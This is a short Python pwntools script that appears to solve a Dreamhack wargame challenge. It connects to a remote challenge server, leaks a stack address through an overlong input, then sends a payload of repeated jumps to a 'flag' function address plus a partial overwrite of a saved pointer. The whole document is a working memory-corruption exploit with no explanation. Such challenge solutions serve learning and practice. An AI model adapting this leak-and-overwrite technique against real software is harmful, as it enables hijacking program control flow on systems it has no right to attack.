from pwn import *
p=remote("host3.dreamhack.games",12261)
flag=0x40135b
payload=p64(flag)
while(len(payload)!=0x130):
	payload=payload+p64(flag)

p.recvuntil(": ")
pause()
p.sendline("a"*0x12f)

p.recvuntil(b"\n")
leak1=p.recv(2)
leak2 = leak1+b"\x00\x00\x00\x00\x00\x00"
p.recvuntil(": ")
leak=int(hex(u64(leak2)), 16)-0x200-0x130
payload = payload + p64(leak-0x8)[:-6]
p.sendline(payload)
print(p.recvall())
